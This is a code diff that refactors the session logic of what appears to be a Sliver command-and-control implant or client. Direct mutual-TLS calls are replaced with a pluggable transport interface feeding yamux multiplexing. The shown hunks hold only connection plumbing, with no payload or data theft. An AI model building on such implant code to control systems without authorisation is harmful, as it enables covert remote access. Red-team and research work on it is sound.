@@ -47,12 +47,14 @@ static long stream_write(void *ctx, const void *buf, size_t len) {
   return (long)len;
 }
 
-static long tls_read(void *ctx, void *buf, size_t len) {
-  return sliver_tls_read((sliver_tls_t *)ctx, buf, len);
+static long transport_read(void *ctx, void *buf, size_t len) {
+  sliver_transport_t *t = (sliver_transport_t *)ctx;
+  return t->read(t, buf, len);
 }
 
-static long tls_write(void *ctx, const void *buf, size_t len) {
-  return sliver_tls_write((sliver_tls_t *)ctx, buf, len);
+static long transport_write(void *ctx, const void *buf, size_t len) {
+  sliver_transport_t *t = (sliver_transport_t *)ctx;
+  return t->write(t, buf, len);
 }
 
 /* Writes one signed envelope on a fresh stream and half-closes it. */
@@ -179,7 +181,7 @@ static void heartbeat_thread(void *arg) {
 }
 
 int sliver_session_run(const sliver_session_config_t *cfg) {
-  sliver_tls_t *tls = NULL;
+  sliver_transport_t *transport = NULL;
   sliver_yamux_t yamux;
   sliver_frame_signer_t signer;
   sliver_buf_t reg_buf, env_buf;
@@ -207,20 +209,20 @@ int sliver_session_run(const sliver_session_config_t *cfg) {
   }
 
   err[0] = '\0';
-  if (sliver_tls_connect(&tls, cfg->host, cfg->port, cfg->ca_pem, cfg->cert_pem,
-                         cfg->key_pem, err, sizeof(err)) != 0) {
+  if (sliver_transport_connect(&transport, cfg->host, cfg->port, cfg->ca_pem,
+                               cfg->cert_pem, cfg->key_pem, err, sizeof(err)) != 0) {
     LOG_ERROR("session: %s", err);
     return -1;
   }
-  LOG_INFO("session: handshake ok (%s / %s)", sliver_tls_version(tls),
-           sliver_tls_ciphersuite(tls));
+  LOG_INFO("session: handshake ok (%s / %s)", transport->version(transport),
+           transport->ciphersuite(transport));
 
-  if (sliver_tls_write(tls, SLIVER_YAMUX_PREFACE, SLIVER_YAMUX_PREFACE_LEN) !=
+  if (transport->write(transport, SLIVER_YAMUX_PREFACE, SLIVER_YAMUX_PREFACE_LEN) !=
       SLIVER_YAMUX_PREFACE_LEN) {
     LOG_ERROR("session: MUX/1 write failed");
     goto out;
   }
-  if (sliver_yamux_client(&yamux, tls_read, tls_write, tls) != 0) {
+  if (sliver_yamux_client(&yamux, transport_read, transport_write, transport) != 0) {
     goto out;
   }
   yamux_ready = 1;
@@ -360,8 +362,8 @@ out:
   if (yamux_ready) {
     sliver_yamux_free(&yamux);
   }
-  if (tls != NULL) {
-    sliver_tls_close(tls);
+  if (transport != NULL) {
+    sliver_transport_free(transport);
   }
   return rc;
 }
